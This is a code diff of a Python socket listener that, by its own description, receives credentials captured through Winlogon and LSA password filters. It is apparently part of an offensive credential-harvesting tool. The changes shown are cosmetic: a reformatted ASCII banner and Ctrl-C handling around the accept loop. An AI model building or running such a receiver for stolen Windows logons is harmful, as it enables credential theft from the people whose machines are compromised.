@@ -31,7 +31,8 @@ def writeFile(storage, addr):
 
 
 def main():
-    print("""\                                                                                                                     
+    print("""                                                                                                                     
+
   _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
  |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
  | |    | /    /| |    | \\    \| \     \ |    | \    \|    ||    |    \______     ______/|     \     \ |    |\    \ 
@@ -45,7 +46,6 @@ def main():
     \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
      '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
             '                                                                                     '                  
-
 """)
     parser = argparse.ArgumentParser(description="Receive creds from Winlogon + LSA Filters")
     parser.add_argument('--ip', type=str, nargs='?', const=1, help="IP to listen on (default: 0.0.0.0)", default='0.0.0.0')
@@ -63,10 +63,14 @@ def main():
     s.bind((args.ip, args.port)) 
     s.listen(100) 
 
-    while True:
-        conn, addr = s.accept() 
-        t = threading.Thread(target=handle_client, args=(conn, addr))
-        t.start()
-
+    try:
+        while True:
+            conn, addr = s.accept() 
+            t = threading.Thread(target=handle_client, args=(conn, addr))
+            t.start()
+            
+    except KeyboardInterrupt:
+	    print("\nArrivederci!")
+	    exit(0)
 
 main()
